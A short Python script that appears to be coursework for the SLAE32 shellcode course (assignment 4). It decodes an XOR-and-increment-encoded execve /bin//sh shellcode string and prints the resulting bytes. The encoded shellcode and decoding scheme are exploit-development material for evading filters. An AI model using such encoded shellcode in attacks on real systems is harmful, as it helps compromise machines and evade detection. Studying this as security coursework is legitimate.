#!/usr/bin/python3
# author     : Sandro "guly" Zaccarini SLAE-1037
# purpose    : this program has been written for SLAE32 assignment 4
# license    : CC-BY-NC-SA
import sys
if sys.version_info[0] < 3:
    raise Exception("Must be using Python 3")

# execve /bin//sh
# encoded
sc = b'\x90\xf2\x91\x39\x46\x1f\x43\x1c\x01\x46\x52\x0a\x04\xe6\x69\xb4\xd8\x68\xb0\xdd\x6b\x52\xba\xc1\x4e\xb0\xf2\x71\xb0\xcf\x4e'

# xor first byte with this value
bxor = 0xa1
# inc by 1 every byte to avoid nulls. manually validate this
inc = 1

z = sc[0]^bxor
ret = [z]

l = len(bytearray(sc))
for i in (range(l - 1)):
    x = sc[i+1]
    y = ret[i]+inc

    z = y^x
    ret.append(z)

print('Len: %d' % len(bytearray(sc)))
for r in ret:
    print('\\x{:02x}'.format(r),end='')
print()
